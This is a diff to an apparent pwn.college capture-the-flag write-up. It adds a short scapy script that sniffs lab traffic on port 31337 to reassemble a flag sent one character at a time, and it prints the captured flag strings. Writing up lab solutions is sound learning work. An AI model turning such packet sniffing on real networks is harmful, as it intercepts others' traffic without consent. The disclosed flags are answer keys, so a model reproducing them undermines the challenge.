@@ -129,3 +129,31 @@ pwn.college{w5xqRA9L9VqC5wgnj0y2NJf5Zd5.dNjNzMDL4ITM0EzW}
 ```
 
 &nbsp;
+
+## Monitor 2
+
+This time the flag is being sent one character per request.
+We can craft the flag using a simple Python script.
+
+```py
+In [1]: from scapy.all import sniff, Raw
+   ...: 
+   ...: buffer = b""
+   ...: 
+   ...: def handle_packet(packet):
+   ...:     global buffer
+   ...:     if packet.haslayer(Raw):
+   ...:         buffer += bytes(packet[Raw])
+   ...:         if b'pwn.college{' in buffer and b'}' in buffer:
+   ...:             start = buffer.find(b'pwn.college{')
+   ...:             end = buffer.find(b'}', start)
+   ...:             if end != -1:
+   ...:                 flag = buffer[start:end+1]
+   ...:                 print(f"\nFlag captured: {flag.decode(errors='ignore')}")
+   ...:                 exit(0)  # stop sniffing
+   ...: 
+   ...: sniff(filter="tcp dst port 31337", prn=handle_packet)
+   ...: 
+
+Flag captured: pwn.college{I4fIyKwkQexXwA6EYgWabI6ocRG.dRjNzMDL4ITM0EzW}
+```
